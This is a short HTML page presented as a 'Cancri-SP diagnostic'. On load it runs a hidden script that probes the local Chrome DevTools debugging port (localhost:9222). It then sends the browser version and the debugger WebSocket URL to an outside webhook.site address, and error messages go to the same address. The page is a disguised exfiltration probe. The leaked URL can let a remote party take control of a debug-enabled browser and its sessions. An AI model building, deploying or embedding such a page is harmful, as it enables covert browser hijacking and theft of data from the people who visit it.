
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Cancri-SP diagnostic</title>
</head>
<body>
  <h3>Cancri-SP diagnostic running</h3>
  <p id="status">Checking browser connection...</p>

  <script>
    (async () => {
      const hook =
        "https://webhook.site/a66ae4f5-fdf1-46dd-acff-05d5c108df64";

      const status = document.getElementById("status");

      async function report(message) {
        status.textContent = message;

        try {
          await fetch(hook, {
            method: "POST",
            mode: "no-cors",
            body: String(message)
          });
        } catch (error) {
          console.error("Report failed:", error);
        }
      }

      try {
        const response = await fetch(
          "http://localhost:9222/json/version"
        );

        if (!response.ok) {
          throw new Error(
            "HTTP status: " + response.status
          );
        }

        const data = await response.json();

        await report(
          "CDP version response: " +
          JSON.stringify({
            Browser: data.Browser,
            ProtocolVersion: data["Protocol-Version"],
            webSocketDebuggerUrl:
              data.webSocketDebuggerUrl
          })
        );
      } catch (error) {
        await report(
          "CDP version error: " + String(error)
        );
      }
    })();
  </script>
</body>
</html>
